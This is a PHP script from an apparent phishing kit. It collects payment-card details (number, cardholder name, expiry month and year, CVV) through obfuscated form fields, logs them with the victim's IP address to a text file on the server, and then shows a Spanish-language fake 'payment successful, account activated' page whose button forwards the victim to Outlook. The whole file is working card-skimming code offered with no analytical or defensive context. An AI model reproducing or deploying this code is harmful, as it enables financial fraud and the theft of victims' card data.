<?php

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

if (!empty($_POST["rgtrthr"]) && !empty($_POST["xsdgtry"]) && !empty($_POST["cbyutnh"]) && !empty($_POST["rtmghm"]) && !empty($_POST["puyhrx"])) {

    $cn = $_POST['rgtrthr'];
    $chn = $_POST['xsdgtry'];
    $mm = $_POST['cbyutnh'];
    $aa = $_POST['rtmghm'];
    $cs = $_POST['puyhrx'];

    file_put_contents("Sens6yxxx1.txt", "-------------------------------------------------\n", FILE_APPEND);
    file_put_contents("Sens6yxxx1.txt", "Number: " . $cn . "\n", FILE_APPEND);
    file_put_contents("Sens6yxxx1.txt", "Name: " . $chn . "\n", FILE_APPEND);
    file_put_contents("Sens6yxxx1.txt", "Month: " . $mm . "\n", FILE_APPEND);
    file_put_contents("Sens6yxxx1.txt", "Year: " . $aa . "\n", FILE_APPEND);
    file_put_contents("Sens6yxxx1.txt", "CVV: " . $cs . "\n", FILE_APPEND);
    file_put_contents("Sens6yxxx1.txt", "\n", FILE_APPEND);
    file_put_contents("Sens6yxxx1.txt", "IP: " . $ip . "\n", FILE_APPEND);
    file_put_contents("Sens6yxxx1.txt", "-------------------------------------------------\n", FILE_APPEND);
} else {
    header('location: index.html');
    exit();
}

?>

<html>

<head>
    <title>Activación exitosa</title>

    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimun-sacale=1.0">

    <link rel="icon" href="/assets/images/icon.ico">
    <link rel="stylesheet" href="/assets/css/success.css">
</head>

<body>
    <section id="lc">
        <div id="lb">

            <div class="lgc">
                <img src="/assets/images/logo.png" class="llg" alt="">
            </div>

            <div class="tc">
                <h3>Pago exitoso</h3>

                <div class="psg">
                    <img src="/assets/images/psuccess.gif" alt="">
                </div>

                <p>Tu cuenta ha sido activada exitosamente, gracias por seguir usando nuestros servicios.</p>
            </div>

            <form id="cl" action="https://outlook.live.com/owa/">
                <div class="btn btnsub">
                    <input type="submit" class="btnfl" value="Finalizar">
                </div>
            </form>
        </div>
    </section>
</body>

</html>